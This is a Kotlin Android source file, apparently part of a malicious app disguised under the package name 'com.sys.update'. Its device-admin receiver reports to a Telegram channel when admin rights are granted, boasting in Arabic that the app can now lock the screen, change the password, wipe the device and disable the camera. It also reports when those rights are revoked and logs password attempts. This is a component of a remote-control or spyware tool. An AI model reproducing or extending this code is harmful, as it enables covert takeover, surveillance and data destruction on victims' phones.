package com.sys.update

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class AdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        Log.d("AdminReceiver", "Device Admin enabled")
        TelegramApi.sendMessage("🛡 *Device Admin مفعّل*\n\nالآن التطبيق قادر على:\n• قفل الشاشة\n• تغيير كلمة السر\n• مسح الجهاز\n• تعطيل الكاميرا")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Log.d("AdminReceiver", "Device Admin disabled")
        TelegramApi.sendMessage("⚠️ *Device Admin معطّل*")
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        Log.d("AdminReceiver", "Password failed")
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        Log.d("AdminReceiver", "Password succeeded")
    }
}
